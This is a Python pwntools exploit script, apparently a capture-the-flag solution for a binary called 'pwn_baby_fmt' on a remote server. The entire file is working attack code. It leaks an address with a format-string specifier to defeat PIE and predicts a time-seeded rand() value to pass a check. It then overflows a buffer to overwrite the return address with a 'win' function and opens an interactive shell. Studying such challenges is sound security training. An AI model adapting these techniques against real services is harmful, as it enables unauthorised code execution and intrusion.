from pwn import *
import argparse
import subprocess
import ctypes
import time

context.log_level = 'DEBUG'
context.aslr = False

# start the process
# p = process('./pwn_baby_fmt')
p = remote("34.185.160.224",31841)
libc = ELF('./libc-2.27.so')
# receive initial prompt
p.recvuntil(b"What's your town?\n")

# leak an address from main in order to get the main base
p.sendline(b'%10$p')
p.recvline() # get first line
leaked = int(p.recvline().decode().lstrip("0x").rstrip("\n"),16)
print("Leaked function address:",hex(leaked))

pie_base = leaked - 0x11c0
print("pie",hex(pie_base))

# calculate the base and the win function address
win_function_address = pie_base + 0x133f
print("Win function address:",hex(win_function_address))

# Generate the random number
libc_lib = ctypes.CDLL(libc.path)

# Get current time and seed
current_time = int(time.time())
libc_lib.srand(current_time+8)

# Generate random number
random_number = libc_lib.rand()
print("Random number",random_number)

# after 4 bytes append the random number
buffer_fill = b'a' * 5
overwrite_to_return = b'a' * 28
payload = buffer_fill + p32(random_number) + overwrite_to_return + p64(win_function_address)

p.recvline()

p.sendline(payload)

# get shell
p.interactive()